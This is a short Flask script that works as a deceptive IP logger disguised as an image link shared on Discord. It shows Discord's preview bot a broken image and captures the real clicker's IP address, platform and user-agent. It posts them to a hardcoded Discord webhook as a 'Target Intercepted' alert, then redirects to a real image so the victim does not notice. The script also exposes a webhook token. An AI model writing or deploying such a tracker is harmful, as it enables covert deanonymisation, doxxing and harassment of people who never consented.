from flask import Flask, request, redirect, render_template_string
import requests

app = Flask(__name__)

# Tactical Endpoint: Where the intel is sent
WEBHOOK_URL = 'https://discord.com/api/webhooks/1499375993515802814/k7NlaKYQ6E9E89EvLFXmqYmQHzSldINIRkq3CZB2JqImHP4ROw7Wa2qbjLtFhgitQmKe'

@app.route('/view/image_<id>.png')
def capture_metadata(id):
    # Analyzing headers to bypass the Discord Proxy
    # If the request comes from Discord's bot, we show a 'Broken' state
    user_agent = request.headers.get('User-Agent', '')
    
    if 'Discordbot' in user_agent:
        # Returning a '403 Forbidden' to Discord's scraper
        # This makes the image look 'Broken' in the client
        return "Access Denied", 403

    # If it's a real user clicking 'Open Original'
    forwarded_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    platform = request.headers.get('Sec-CH-UA-Platform', 'Unknown')
    
    intel = {
        "embeds": [{
            "title": "🎯 Target Intercepted",
            "color": 15158332,
            "fields": [
                {"name": "IP Address", "value": f"`{forwarded_ip.split(',')[0]}`", "inline": True},
                {"name": "Device/OS", "value": f"`{platform}`", "inline": True},
                {"name": "User-Agent", "value": f"```{user_agent}```"}
            ]
        }]
    }
    
    # Sending intel to the Webhook
    requests.post(WEBHOOK_URL, json=intel)

    # Final Redirect: Send them to the actual image so they don't suspect a thing
    return redirect("https://i.imgur.com/BcNs5vF.jpg")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
